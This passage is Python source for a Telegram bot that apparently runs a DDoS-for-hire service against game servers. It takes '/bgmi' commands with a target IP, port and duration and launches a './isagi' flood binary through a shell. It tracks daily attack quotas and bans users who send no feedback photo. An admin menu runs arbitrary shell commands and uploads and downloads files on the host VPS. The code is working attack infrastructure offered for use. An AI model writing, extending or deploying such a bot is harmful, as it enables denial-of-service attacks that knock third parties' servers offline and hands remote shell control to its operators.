                f"📵 𝘽𝙚𝙝𝙩𝙖𝙧 𝙃𝙖𝙞 𝙖𝙗𝙝𝙞 𝙘𝙝𝙞𝙡𝙡 𝙢𝙖𝙖𝙧 🙃"
            )
            return
        else:
            del user_bans[user_id]





    # Check if user is exempted from cooldowns, limits, and feedback requirements
    if user_id not in EXEMPTED_USERS:
        # Check if user is in cooldown
        if user_id in user_cooldowns:
            cooldown_time = user_cooldowns[user_id]
            if datetime.now() < cooldown_time:
                remaining_time = (cooldown_time - datetime.now()).seconds
                bot.send_message(
                    message.chat.id,
                    f"🧊 𝙃𝙤𝙡𝙙 𝙤𝙣 (@{message.from_user.username})...\n\n"
                    f"⛔‼️ ꧁ 𝙏𝙪 𝘾𝙤𝙤𝙡𝙙𝙤𝙬𝙣 𝙈𝙤𝙙𝙚 𝙈𝙚𝙞𝙣 𝙃𝘼𝙄 ꧂ ‼️⛔\n\n"
                    f"⏳ 𝙒𝘼𝙄𝙏 𝙆𝘼𝙍 𝘽𝙍𝙊: {remaining_time // 60} 𝙢𝙞𝙣 {remaining_time % 60} 𝙨𝙚𝙘\n\n"
                    f"💡 𝘼𝙜𝙖𝙞𝙣 𝙏𝙧𝙮 𝘽𝙖𝙙𝙢𝙚... 𝙋𝙖𝙩𝙞𝙚𝙣𝙘𝙚 𝙞𝙨 𝙋𝙤𝙬𝙚𝙧!"
                )
                return


        # Check attack count
        if user_id not in user_attacks:
            user_attacks[user_id] = 0

        if user_attacks[user_id] >= DAILY_ATTACK_LIMIT:
            bot.send_message(
                message.chat.id,
                f"⚔️ 𝙃𝙞 {message.from_user.first_name} (@{message.from_user.username}),\n\n"
                f"🚫 𝘼𝙟 𝙠𝙚 𝙡𝙞𝙚 𝙗𝙖𝙨 𝙝𝙤 𝙜𝙖𝙮𝙖 𝙗𝙝𝙖𝙞! 💣\n"
                f"📛 𝙏𝙪𝙣𝙚 𝙖𝙥𝙣𝙖 𝘿𝘼𝙄𝙇𝙔 𝘼𝙏𝙏𝘼𝘾𝙆 𝙇𝙄𝙈𝙄𝙏 𝙩𝙤𝙧 𝙙𝙞𝙖 😵‍💫\n\n"
                f"⏳ 𝘼𝙗 𝙆𝘼𝙇 𝙖𝙖𝙣𝙖 𝙣𝙚𝙬 𝙥𝙤𝙬𝙚𝙧 𝙠𝙚 𝙨𝙖𝙩𝙝 ⚡\n"
                f"✌️ 𝘾𝙝𝙞𝙡𝙡 K𝙖𝙧 𝙖𝙗𝙝𝙞 𝙠𝙚 𝙡𝙞𝙚..."
            )
            return


    # 🧨 Check if the user has provided feedback after the last attack — else ban them
    if user_id in user_attacks and user_attacks[user_id] > 0 and not user_photos.get(user_id, False):
        ban_end = datetime.now() + BAN_DURATION
        user_bans[user_id] = ban_end

        remaining = ban_end - datetime.now()
        minutes, seconds = divmod(remaining.seconds, 60)
        username = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name

        bot.send_message(
            message.chat.id,
            f"❌ ꧁ 𝗧𝗨 𝘼𝘽 𝘽𝘼𝙉 𝙃𝘼𝙄 😐 ꧂\n"
            f"👤 𝙐𝙨𝙚𝙧: `{username}`\n"
            f"📸 𝘼𝙩𝙩𝙖𝙘𝙠 k𝙚 𝙗𝙖𝙖𝙙 𝙥𝙝𝙤𝙩𝙤 𝙣𝙖𝙝𝙞 𝙗𝙝𝙚j𝙖a\n"
            f"🔐 𝘽𝘼𝙉 𝙇𝘼𝙂 𝙂𝘼𝙔𝘼 𝘽𝙃𝘼𝙄...\n"
            f"⏳ 𝙒𝘼𝙄𝙏: `{minutes}m {seconds}s`\n"
            f"😎 𝙉𝙚𝙭𝙩 𝙏𝙞𝙢𝙚 𝙍𝙪𝙡𝙚 𝙁𝙤𝙡𝙡𝙤𝙬 𝙆𝙖𝙧!"
        )
        return







    # Split the command to get parameters
    try:
        args = message.text.split()[1:]  # Skip the command itself
        logging.info(f"📥 𝗔𝗥𝗚𝗨𝗠𝗘𝗡𝗧𝗦 𝗥𝗘𝗖𝗘𝗜𝗩𝗘𝗗 ✅ ➤: {args}")





        if len(args) != 3:
            raise ValueError("🚫 𝐈𝐒𝐀𝐆𝐈 × 𝗗𝗶𝗟𝗗𝗢𝗦™ 𝗣𝗨𝗕𝗟𝗜𝗖 𝗕𝗢𝗧 𝗜𝗦 𝗟𝗜𝗩𝗘 ✅\n\n"
                             "⚙️ 𝗣𝗹𝗲𝗮𝘀𝗲 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗰𝗼𝗿𝗿𝗲𝗰𝘁 𝗳𝗼𝗿𝗺𝗮𝘁:\n"
                             "➤ /bgmi <𝗍𝖺𝗋𝗀𝖾𝗍_𝗂𝗉> <𝗍𝖺𝗋𝗀𝖾𝗍_𝗉𝗈𝗋𝗍> <𝖽𝗎𝗋𝖺𝗍𝗂𝗈𝗇>\n\n")

        target_ip, target_port, user_duration = args







        # Validate inputs
        if not is_valid_ip(target_ip) or not target_ip.startswith(ALLOWED_IP_PREFIXES):
            raise ValueError("⛔️ 𝗘𝗿𝗿𝗼𝗿: 𝗨𝘀𝗲 𝘃𝗮𝗹𝗶𝗱 𝗜𝗣 𝘁𝗼 𝗮𝘁𝘁𝗮𝗰𝗸")






        if not is_valid_port(target_port):
            raise ValueError("Invalid port number.")
        if int(target_port) in BLOCKED_PORTS:
            raise ValueError(f"‼️ 𝙋𝙤𝙧𝙩 `{target_port}` 𝙞𝙨 𝘽𝙇𝙊𝘾𝙆𝙀𝘿 ‼️\n\n 𝗰𝗮𝗻𝗻𝗼𝘁 𝗯𝗲 𝘂𝘀𝗲 ✅")



        if not is_valid_duration(user_duration):
            raise ValueError("⏱️ 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡 𝗘𝗥𝗥𝗢𝗥 ⚠️\n\n"
                             "🧮 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗧𝗶𝗺𝗲 𝗙𝗿𝗮𝗺𝗲 𝗗𝗲𝘁𝗲𝗰𝘁𝗲𝗱 ❌\n"
                             "🕓 𝗘𝗻𝘁𝗲𝗿𝗲𝗱: '{}'\n"
                             "✔️ 𝗘𝘅𝗽𝗲𝗰𝘁𝗲𝗱: A 𝗽𝗼𝘀𝗶𝘁𝗶𝘃𝗲 𝗶𝗻𝘁𝗲𝗴𝗲𝗿 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n\n"
                             "💡 𝗛𝗜𝗡𝗧: 𝗧𝗿𝘆 𝘀𝗼𝗺𝗲𝘁𝗵𝗶𝗻𝗴 𝗹𝗶𝗸𝗲: 60, 120, 300")




        # Increment attack count for non-exempted users
        if user_id not in EXEMPTED_USERS:
            user_attacks[user_id] += 1
            user_photos[user_id] = False  # Reset photo feedback requirement

        # Set cooldown for non-exempted users
        if user_id not in EXEMPTED_USERS:
            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)

        # Notify that the attack will run for the default duration of 150 seconds, but display the input duration
        default_duration = 180
        attack_running = True
        attack_end_time = datetime.now() + timedelta(seconds=default_duration)

        
        remaining_attacks = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
        
        user_info = message.from_user
        username = user_info.username if user_info.username else user_info.first_name
        bot.send_message(
    message.chat.id,
    f"╔════════════════════════════════╗\n"
    f"║ 🚀 **𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧𝗘𝗗!** 🚀 ║\n"
    f"╚════════════════════════════════╝\n\n"
    f"🔥 **𝗔𝗧𝗧𝗔𝗖𝗞𝗘𝗥:** 🎭 `{message.from_user.first_name}`\n"
    f"🏆 **𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘:** `@{username}`\n\n"
    f"🎯 **𝗧𝗔𝗥𝗚𝗘𝗧 𝗗𝗘𝗧𝗔𝗜𝗟𝗦:**\n"
    f"╔═════════════════════════════╗\n"
    f"║ 🎯 **𝗧𝗔𝗥𝗚𝗘𝗧 𝗜𝗣:** `{target_ip} : {target_port}`\n"
    f"║ ⏳ **𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡:** `{default_duration} sec`\n"
    f"║ 🔥 **𝗜𝗡𝗣𝗨𝗧 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡:** `{user_duration} sec`\n"
    f"╚═════════════════════════════╝\n\n"
    f"🎖 **𝗥𝗘𝗠𝗔𝗜𝗡𝗜𝗡𝗚 𝗔𝗧𝗧𝗔𝗖𝗞𝗦:** `{remaining_attacks} / 5`\n"
    f"⚠️ **𝗦𝗘𝗡𝗗 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞 𝗔𝗙𝗧𝗘𝗥 𝗚𝗔𝗠𝗘!** ⚠️\n",
    reply_to_message_id=message.message_id,
    reply_markup=InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📊 STATUS", callback_data="user_status")
        ],
        [
            InlineKeyboardButton("➖ 𝗝𝗢𝗜𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 ➖", url="https://t.me/+hqtU3MTPU28xNDE1"),
            InlineKeyboardButton("👑 𝗖𝗥𝗘𝗔𝗧𝗢𝗥 👑", url="https://t.me/+hqtU3MTPU28xNDE1")
        ]
    ])
)


        # Log the attack started message
        logging.info(f"Attack started by {user_name}: ./isagi {target_ip} {target_port} {default_duration}")

        # Run the attack command with the default duration and pass the user-provided duration for the finish message
        asyncio.run(run_attack_command_async(target_ip, int(target_port), user_duration, default_duration, message.chat.id, message.from_user.username if message.from_user.username else message.from_user.first_name))

    except Exception as e:
        bot.send_message(message.chat.id, str(e))
        attack_running = False

async def run_attack_command_async(target_ip, target_port, user_duration, default_duration, chat_id, username):
    global attack_running
    try:
        command = f"./isagi {target_ip} {target_port} {user_duration} 850"
        process = await asyncio.create_subprocess_shell(command)
        await process.communicate()
        bot.send_message(
    GROUP_ID,
    f"╔════════════════════════════════╗\n"
    f"║ 🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬! 🚀 ║\n"
    f"╚════════════════════════════════╝\n"
    f"🎯 𝗧𝗔𝗥𝗚𝗘𝗧 𝗜𝗡𝗙𝗢:\n"
    f"╔════════════════════════════════════╗\n"
    f"║ 🎯 𝗜𝗣              ➤  `{target_ip}`\n"
    f"║ 🚪 𝗣𝗢𝗥𝗧           ➤  `{target_port}`\n"
    f"║ ⏱️ 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡      ➤  `{user_duration} sec`\n"
    f"║ ⏳ 𝗗𝗘𝗙𝗔𝗨𝗟𝗧 𝗧𝗜𝗠𝗘  ➤  `{default_duration} sec`\n"
    f"╚════════════════════════════════════╝\n"
    f"💀 𝗘𝗫𝗘𝗖𝗨𝗧𝗘𝗗 𝗕𝗬: 🥷 @{username} 💀\n"
    f"⚡ 𝗠𝗜𝗦𝗦𝗜𝗢𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 — 𝐈𝐒𝐀𝐆𝐈 ⚡",
    reply_markup=InlineKeyboardMarkup([
        [
            InlineKeyboardButton("💬 SUPPORT", url="https://t.me/+hqtU3MTPU28xNDE1"),
            InlineKeyboardButton("👑 OWNER", url="https://t.me/+hqtU3MTPU28xNDE1")
        ]
    ])
)
    except Exception as e:
        bot.send_message(GROUP_ID, f"Error running attack command: {e}")

    finally:
        attack_running = False



# --------------------------------------------------------------
        

        
        
        
# --------------------[ TERMINAL SECTION ]----------------------

import os
import subprocess
import threading
import time
from telebot import types

# ✅ **Admin ID List (Yahan Apna Real Telegram ID Daal!)**
ADMIN_IDS = [6353114118]  # ✅ **Integer format me rakhna, string mat bana!**


# ✅ VPS MENU COMMAND
@bot.message_handler(func=lambda message: message.text == "VPS")
def VPS_menu(message):
    user_id = message.chat.id

    if user_id in ADMIN_IDS:
        # 🖼️ Send Terminal Banner
        try:
            with open("terminal_menu.sh", "rb") as photo:
                bot.send_photo(
                    chat_id=user_id,
                    photo=photo,
                    caption="🧠 *Welcome to VPS Control Center*",
                    parse_mode="Markdown"
                )
        except Exception as e:
            bot.send_message(
                user_id,
                f"⚠️ Error loading terminal image:\n`{str(e)}`",
                parse_mode="Markdown"
            )

        # ⌨️ Terminal Menu Keyboard
        markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        markup.add(
            KeyboardButton("🖥️ Command"),
            KeyboardButton("📤 Upload"),
            KeyboardButton("📥 Download"),
            KeyboardButton("🔙 << Back to Menu")
        )

        bot.send_message(
            chat_id=user_id,
            text=(
                "⚙️ *FLASH TERMINAL MENU*\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "Choose an option below to interact with the VPS.\n"
                "━━━━━━━━━━━━━━━━━━━━"
            ),
            reply_markup=markup,
            parse_mode="Markdown"
        )

    else:
        # ❌ Denied Access with Image
        try:
            with open("LAND.sh", "rb") as photo:
                bot.send_photo(
                    chat_id=user_id,
                    photo=photo,
                    caption="⛔ *Access Denied*\nYou are not authorized to access this menu.",
                    parse_mode="Markdown"
                )
        except Exception:
            bot.send_message(
                chat_id=user_id,
                text="⛔ *Access Denied: You are not an admin.*",
                parse_mode="Markdown"
            )

# ✅ COMMAND EXECUTION
@bot.message_handler(func=lambda message: message.text == "🖥️ Command" or message.text == "Command")
def command_to_VPS(message):
    user_id = message.chat.id
    if user_id in ADMIN_IDS:
        bot.reply_to(message, "💻 *Enter Your Command:*", parse_mode="MarkdownV2")
        bot.register_next_step_handler(message, execute_VPS_command)
    else:
        bot.reply_to(message, "⛔ *You are not an admin.*", parse_mode="MarkdownV2")

def execute_VPS_command(message):
    try:
        command = message.text.strip()
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout or result.stderr

        bot.reply_to(
            message,
            f"✅ *Command Output:*\n```\n{output}\n```",
            parse_mode="MarkdownV2"
        )
    except Exception as e:
        bot.reply_to(
            message,
            f"❗ *Execution Failed:*\n`{str(e)}`",
            parse_mode="MarkdownV2"
        )

# ✅ FILE UPLOAD
@bot.message_handler(func=lambda message: message.text == "📤 Upload" or message.text == "Upload")
def upload_to_VPS(message):
    user_id = message.chat.id
    if user_id in ADMIN_IDS:
        bot.reply_to(message, "📁 *Please send the file to upload:*", parse_mode="MarkdownV2")
        bot.register_next_step_handler(message, process_file_upload)
    else:
        bot.reply_to(message, "⛔ *You are not an admin.*", parse_mode="MarkdownV2")

def process_file_upload(message):
    if message.document:
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)

            file_path = os.path.join(os.getcwd(), message.document.file_name)
            with open(file_path, 'wb') as new_file:
                new_file.write(downloaded_file)

            bot.reply_to(
                message,
                f"✅ *File Uploaded Successfully!*\n`{file_path}`",
                parse_mode="MarkdownV2"
            )
        except Exception as e:
            bot.reply_to(
                message,
                f"❗ *Upload Failed:*\n`{str(e)}`",
                parse_mode="MarkdownV2"
            )

# ✅ FILE DOWNLOAD
@bot.message_handler(func=lambda message: message.text == "📥 Download" or message.text == "Download")
def list_files(message):
    user_id = message.chat.id
    if user_id not in ADMIN_IDS:
        bot.send_message(message.chat.id, "⛔ *You are not an admin.*", parse_mode="MarkdownV2")
        return

    files = [f for f in os.listdir() if os.path.isfile(f) and not f.startswith(".")]

    if not files:
        bot.send_message(message.chat.id, "📁 *No Files Available in VPS.*", parse_mode="MarkdownV2")
        return

    markup = InlineKeyboardMarkup()
    for file in files:
        markup.add(InlineKeyboardButton(f"📄 {file}", callback_data=f"download_{file}"))
    
    markup.add(InlineKeyboardButton("❌ Cancel", callback_data="cancel_download"))
    bot.send_message(
        message.chat.id,
        "📂 *Select a file to download:*",
        reply_markup=markup,
        parse_mode="MarkdownV2"
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("download_"))
def send_file(call):
    user_id = call.message.chat.id
    if user_id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "⛔ Access Denied")
        return

    filename = call.data.replace("download_", "")
    if not os.path.exists(filename):
        bot.answer_callback_query(call.id, "❌ File Not Found")
        return

    with open(filename, "rb") as file:
        bot.send_document(call.message.chat.id, file)

    bot.answer_callback_query(call.id, "✅ File Sent!")

@bot.callback_query_handler(func=lambda call: call.data == "cancel_download")
def cancel_download(call):
    bot.edit_message_text(
        "❗ *Download Cancelled.*",
        call.message.chat.id,
        call.message.message_id,
        parse_mode="MarkdownV2"
    )

# ✅ BACK TO MENU
@bot.message_handler(func=lambda message: message.text == "🔙 << Back to Menu" or message.text == "<< Back to Menu")
def back_to_main_menu(message):
    bot.send_message(
        message.chat.id,
        "🔙 *Returned to Main Menu.*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode="Markdown"
    )


#-----------------------------------------------------------------------------------




                             #NEW_SYSTEM 



#-----------------------------------------------------------------------------------

import os, sys

@bot.message_handler(commands=['restart'])
def restart_bot(message):
    if message.from_user.id not in ADMIN_IDS:
        return bot.reply_to(message, "🚫 **Access Denied!**", parse_mode="Markdown")

    loading_msg = bot.reply_to(message, "♻️ **Restarting bot...** ⏳", parse_mode="Markdown")

    for progress in ["🔄 10% ░░░░░░░░", "🔄 40% ███░░░░░", "🔄 70% ██████░░", "🔄 100% ████████ ✅"]:
        time.sleep(0.5)
        bot.edit_message_text(progress, message.chat.id, loading_msg.message_id)

    os.execv(sys.executable, ['python3'] + sys.argv)



@bot.message_handler(commands=['show'])
def show_all_commands(message):
    user_id = message.from_user.id
    is_admin = user_id in ADMIN_IDS

    commands_text = "*📜 HELP FULL COMMAND LIST 📜*\n\n"

    # 🎮 User Commands
    commands_text += (
        "*╭───🎮 USER COMMANDS 🎮───╮*\n"
        "┣ **/start** – *Welcome Message*\n"
        "┣ **/help** – *Help & Instructions*\n"
        "┣ **/bgmi <ip> <port> <time>** – *Launch Attack*\n"
        "┣ **/status** – *Check Attack Status*\n"
        "┣ **/id** – *Show Your Telegram ID*\n"
        "┣ **/show** – *Show This Command Panel*\n"
        "┣ *(Send Photo)* – *Send Feedback to Unban*\n"
        "*╰─────────────────────────╯*\n\n"
    )

    # 👑 Admin Commands (only shown to admin)
    if is_admin:
        commands_text += (
            "*╭───👑 ADMIN COMMANDS 👑───╮*\n"
            "┣ **/reset <user_id>** – *Reset User Stats*\n"
            "┣ **/vps_status** – *View VPS Usage*\n"
            "┣ **/restart** – *Restart the Bot*\n"
            "┣ **VPS** – *Open VPS Menu*\n"
            "┣ **Command** – *Execute VPS Command*\n"
            "┣ **Upload** – *Upload File to VPS*\n"
            "┣ **Download** – *Download File from VPS*\n"
            "┣ **<< Back to Menu** – *Return to Main Menu*\n"
            "*╰─────────────────────────╯*\n\n"
        )

    # Footer with links
    commands_text += (
        "📢 [**Join Channel**](https://t.me/+hqtU3MTPU28xNDE1)\n"
        "👑 [**Creator**](https://t.me/+hqtU3MTPU28xNDE1)"
    )

    # Send full command panel
    bot.send_message(message.chat.id, commands_text, parse_mode="Markdown", disable_web_page_preview=True)

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------



# ⚙️『 Sourav CHANNEL MANAGEMENT PANEL 』⚙️


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#PAPA FLASH

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

import random

@bot.message_handler(commands=['aura'])
def aura_command(message):
    try:
        target = message.text.split(" ", 1)[1]
    except:
        target = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name

    aura = random.randint(30, 100)
    verdict = (
        "🧊 Low Vibes ❄️" if aura <= 50 else
        "🔥 RISING TF WARRIOR 🔥" if aura <= 75 else
        "💀 TRUE FLASH BLOODED ⚡"
    )

    aura_msg = (
        f"⚡ * ENERGY REPORT* ⚡\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"👤 *User:* `{target}`\n"
        f"🔋 *Aura Level:* `{aura}%`\n"
        f"💬 *Verdict:* `{verdict}`\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"👑 *POWERED BY SLAYER_OP7*"
    )
    bot.reply_to(message, aura_msg, parse_mode="Markdown")

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

USER_FILE = "users.json"

# Load users
if os.path.exists(USER_FILE):
    with open(USER_FILE, "r") as f:
        all_users = set(json.load(f))
else:
    all_users = set()

def save_users():
    with open(USER_FILE, "w") as f:
        json.dump(list(all_users), f)



# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ✅ Store broadcast targets temporarily
broadcast_targets = {}

@bot.message_handler(commands=['brocast'])
def start_broadcast(message):
    if message.from_user.id not in ADMIN_IDS:
        return bot.reply_to(message, "🚫 *Access Denied!*", parse_mode="Markdown")

    # Ask where to send
    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("👥 GROUP ONLY", callback_data="brocast_group"),
        InlineKeyboardButton("👤 USERS ONLY", callback_data="brocast_users"),
        InlineKeyboardButton("📡 BOTH", callback_data="brocast_both")
    )

    bot.send_message(
        message.chat.id,
        "📢 *CHOOSE WHERE TO BROADCAST:*",
        reply_markup=keyboard,
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("brocast_"))
def select_target(call):
    user_id = call.from_user.id
    if user_id not in ADMIN_IDS:
        return bot.answer_callback_query(call.id, "❌ You're not an admin!")

    target = call.data.split("_")[1]  # group, users, or both
    broadcast_targets[user_id] = target
    msg = bot.send_message(call.message.chat.id, "✏️ *DROP YOUR MESSAGE:*", parse_mode="Markdown")
    bot.register_next_step_handler(msg, handle_broadcast_message)

def handle_broadcast_message(message):
    user_id = message.from_user.id
    target = broadcast_targets.get(user_id)

    if not target:
        return bot.reply_to(message, "❌ *Target not set!* Use `/brocast` again.", parse_mode="Markdown")

    recipients = []
    if target == "group":
        recipients.append(int(GROUP_ID))
    elif target == "users":
        recipients.extend(all_users)
    elif target == "both":
        recipients.extend(all_users)
        recipients.append(int(GROUP_ID))

    success, fail = 0, 0

    for uid in set(recipients):  # avoid duplicates
        try:
            if message.content_type == 'text':
                bot.send_message(uid, message.text, parse_mode="Markdown")
            elif message.content_type == 'photo':
                bot.send_photo(uid, message.photo[-1].file_id, caption=message.caption or "")
            elif message.content_type == 'video':
                bot.send_video(uid, message.video.file_id, caption=message.caption or "")
            elif message.content_type == 'document':
                bot.send_document(uid, message.document.file_id, caption=message.caption or "")
            else:
                continue
            success += 1
        except Exception as e:
            print(f"[Broadcast Fail] {uid}: {e}")
            fail += 1

    bot.reply_to(
        message,
        f"✅ *Broadcast Done!*\n🟢 Delivered: {success}\n🔴 Failed: {fail}",
        parse_mode="Markdown"
    )

    # Clean up
    broadcast_targets.pop(user_id, None)


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------





# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# ✅ Start polling in safe loop
if __name__ == "__main__":
    logging.info("⚙️ Bot is starting...")

    while True:
        try:
            bot.polling(none_stop=True, timeout=30)
        except Exception as e:
            logging.error(f"🚨 Polling error: {e}")
            traceback.print_exc()

            # Wait a bit before retrying
            time.sleep(5)
            logging.info("🔁 Restarting polling...")

